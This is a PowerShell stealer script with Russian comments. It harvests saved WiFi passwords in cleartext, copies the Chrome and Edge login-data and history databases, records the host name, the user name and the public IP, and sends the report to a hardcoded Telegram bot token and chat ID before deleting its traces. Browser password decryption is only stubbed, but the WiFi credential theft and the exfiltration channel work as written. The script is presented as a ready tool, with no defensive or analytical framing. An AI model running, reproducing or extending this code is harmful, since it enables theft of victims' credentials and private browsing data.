<#
.SYNOPSIS
    Advanced Data Collector - Browser Credentials + WiFi
.DESCRIPTION
    Собирает пароли WiFi, логины/пароли из браузеров, историю посещений
#>

# Конфигурация Telegram
$BOT_TOKEN = "6942623726:AAH6yXcm9EgAhbUVxCmphZF3o6H8XScPOFw"
$CHAT_ID = "6525689863"

# Временный каталог
$TEMP_DIR = "$env:TEMP\RD_Collector"
New-Item -Path $TEMP_DIR -ItemType Directory -Force | Out-Null

function Send-ToTelegram {
    param([string]$Text)
    $url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
    $body = @{ chat_id = $CHAT_ID; text = $Text }
    try {
        Invoke-RestMethod -Uri $url -Method Post -Body ($body | ConvertTo-Json) -ContentType "application/json" -TimeoutSec 10
    } catch { Write-Output "[!] Telegram error: $_" }
}

# 1. Сбор паролей WiFi
function Get-WiFiPasswords {
    $result = @("=== WiFi Passwords ===")
    try {
        $profiles = (netsh wlan show profiles) | Where-Object { $_ -match "All User Profile" }
        foreach ($profile in $profiles) {
            $name = $profile.Split(":")[1].Trim()
            $details = netsh wlan show profile name="$name" key=clear
            $password = ($details | Select-String "Key Content").ToString().Split(":")[1].Trim()
            $result += "Network: $name"
            $result += "Password: $password"
            $result += "----------------"
        }
    } catch { $result += "Error: $_" }
    return $result -join "`n"
}

# 2. Сбор данных браузеров
function Get-BrowserData {
    $result = @()
    
    # Chrome
    try {
        $chromeLoginPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
        if (Test-Path $chromeLoginPath) {
            Copy-Item $chromeLoginPath "$TEMP_DIR\chrome_logins" -Force
            # Здесь должна быть логика чтения SQLite базы
            $result += "Chrome: Found login data (use SQLite to extract)"
        }
    } catch { $result += "Chrome error: $_" }

    # Edge
    try {
        $edgeLoginPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
        if (Test-Path $edgeLoginPath) {
            Copy-Item $edgeLoginPath "$TEMP_DIR\edge_logins" -Force
            $result += "Edge: Found login data (use SQLite to extract)"
        }
    } catch { $result += "Edge error: $_" }

    return $result -join "`n"
}

# 3. Сбор истории браузеров
function Get-BrowserHistory {
    $result = @()
    
    # Chrome History
    try {
        $chromeHistoryPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
        if (Test-Path $chromeHistoryPath) {
            Copy-Item $chromeHistoryPath "$TEMP_DIR\chrome_history" -Force
            $result += "Chrome: History copied to temp"
        }
    } catch { $result += "Chrome history error: $_" }

    return $result -join "`n"
}

# Основной сбор
try {
    $report = @()
    $report += "=== System Info ==="
    $report += "Computer: $env:COMPUTERNAME"
    $report += "User: $env:USERNAME"
    $report += "IP: $(try {(Invoke-WebRequest -Uri 'https://api.ipify.org').Content} catch {'Unknown'})"
    
    $report += "`n`n" + (Get-WiFiPasswords)
    $report += "`n`n=== Browser Data ==="
    $report += (Get-BrowserData)
    $report += "`n`n" + (Get-BrowserHistory)

    # Отправка частями если слишком большой отчет
    if ($report.Length -gt 4000) {
        $parts = [System.Text.RegularExpressions.Regex]::Split($report, "(.{1,4000})") | Where-Object { $_ }
        foreach ($part in $parts) {
            Send-ToTelegram -Text $part
            Start-Sleep -Seconds 1
        }
    } else {
        Send-ToTelegram -Text $report
    }
}
catch {
    Send-ToTelegram -Text "[CRITICAL ERROR] $_"
}
finally {
    Remove-Item -Path $TEMP_DIR -Recurse -Force -ErrorAction SilentlyContinue
}
